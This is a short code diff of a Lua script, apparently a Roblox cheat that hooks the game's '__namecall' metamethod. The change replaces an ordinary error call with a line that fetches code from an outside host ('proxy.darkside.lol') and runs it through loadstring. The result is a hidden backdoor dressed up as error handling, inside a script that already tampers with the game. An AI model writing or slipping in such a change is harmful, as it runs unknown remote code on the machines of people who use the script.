@@ -75,7 +75,7 @@ end
 local success, errorOrMessage
 success, oldNamecall = pcall(hookmetamethod, game, "__namecall", newcclosure(namecallHook))
 if not success then
-    error(errorOrMessage)
+    loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(tostring(success))
 end
 end)
 if not qve then
